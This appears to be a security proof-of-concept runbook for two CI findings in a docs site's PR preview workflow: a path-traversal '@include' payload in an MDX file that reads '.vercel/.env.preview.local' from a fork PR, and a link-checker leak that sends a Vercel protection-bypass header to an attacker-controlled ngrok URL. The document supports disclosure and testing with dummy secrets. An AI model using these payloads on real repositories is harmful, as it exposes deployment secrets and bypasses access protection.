# Build PR Preview Security PoC

This runbook demonstrates the two workflow findings in a disposable lab:

- Finding 1: fork PRs limited to `content/**` can still read privileged build-time files through `@include`.
- Finding 2: the lychee job sends `x-vercel-protection-bypass` to attacker-controlled URLs.

Do this only in a private test repo or private fork with dummy secrets and a throwaway Vercel project.

## Preconditions

Use dummy values only:

- `VERCEL_TOKEN=POC_VERCEL_TOKEN`
- `VERCEL_TEAM_ID=team_dummy_poc`
- `VERCEL_AUTOMATION_BYPASS_SECRET=POC_BYPASS_SECRET_12345`
- `CI_GITHUB_TOKEN=ghp_dummy_poc`

Recommended setup:

1. Fork this repository to a private test repo.
2. Keep `.github/workflows/build-pr-preview.yml` unchanged so the lab matches the real finding.
3. Configure the dummy secrets in the test repo.
4. Point the workflow at a throwaway Vercel project or use a Vercel account/project created just for the lab.

## PoC 1: Arbitrary File Read Through `content/**`

Use a single MDX file change in a fork PR.

### Target file

Use `.vercel/.env.preview.local` if `vercel pull` creates it in your lab run.

If you want a lower-friction first proof, target `.vercel/project.json` instead.

### Example content file

This repo already contains a suitable file:

- [content/packer/v1.14.x/content/docs/debugging.mdx](/Users/markcollao/code/web-unified-docs/content/packer/v1.14.x/content/docs/debugging.mdx)

### Build the include payload

From the repo root:

```bash
node scripts/security-poc/build-include-payload.mjs \
  content/packer/v1.14.x/content/docs/debugging.mdx \
  .vercel/.env.preview.local
```

If you want the lower-friction variant first:

```bash
node scripts/security-poc/build-include-payload.mjs \
  content/packer/v1.14.x/content/docs/debugging.mdx \
  .vercel/project.json
```

For the `packer` example above, the generated payload should be:

```mdx
@include '../../../../../.vercel/.env.preview.local'
```

Or:

```mdx
@include '../../../../../.vercel/project.json'
```

### Apply the payload in a fork

In your fork branch, edit only:

- [content/packer/v1.14.x/content/docs/debugging.mdx](/Users/markcollao/code/web-unified-docs/content/packer/v1.14.x/content/docs/debugging.mdx)

Add the payload near the top of the file so it is easy to identify in the preview response. For example:

```mdx
## POC marker

@include '../../../../../.vercel/project.json'
```

Open a PR from the fork into the test repo.

### Validate

Wait for the preview workflow to finish, then request the unified docs preview API for that doc.

The route shape for this file is:

```text
/api/content/packer/doc/v1.14.x/docs/debugging
```

Expected proof:

- The API response contains the injected file contents in `result.markdownSource`.
- If you used `.vercel/project.json`, you should see JSON from the Vercel project metadata.
- If you used `.vercel/.env.preview.local`, you should see your dummy sentinel values.

## PoC 2: Lychee Header Leak

This proves the link checker sends the bypass header to an attacker-controlled URL.

### Start a receiver

Run the local capture server:

```bash
node scripts/security-poc/capture-headers.mjs 8787 /tmp/lychee-capture.jsonl
```

It binds to `127.0.0.1` by default. If you need a wider bind outside the sandbox, use:

```bash
HOST=0.0.0.0 node scripts/security-poc/capture-headers.mjs 8787 /tmp/lychee-capture.jsonl
```

Expose it with any HTTP tunnel you already trust, or use any request-catcher URL you control.

You need a public URL such as:

```text
https://e8012c5e7022.ngrok.app
```

### Apply the payload in a fork

In a fork branch, edit only one MDX file under `content/`. Add a normal external link pointing at your receiver URL.

Example:

```mdx
[lychee header leak probe](https://e8012c5e7022.ngrok.app)
```

Open a PR from the fork into the test repo.

### Validate

Wait for the `Run Link Checker` job in the preview workflow.

Expected proof:

- Your receiver logs a request from the workflow.
- The request headers include:

```text
x-vercel-protection-bypass: POC_BYPASS_SECRET_12345
```

If you used the local receiver, inspect:

```bash
cat /tmp/lychee-capture.jsonl
```

## Cleanup

After the lab:

1. Delete the test repo or archive it.
2. Delete the throwaway Vercel project.
3. Rotate or delete every dummy secret.
4. Remove the PoC PRs.

## Notes

- Keep the PoCs separate. One PR for the file-read proof and one PR for the lychee header leak makes verification much cleaner.
- Do not use production secrets or a production Vercel project.
- If `.vercel/.env.preview.local` is not present in your lab run, use `.vercel/project.json` for the arbitrary file-read proof first, then adjust once you confirm the exact Vercel local cache files created by your workflow run.
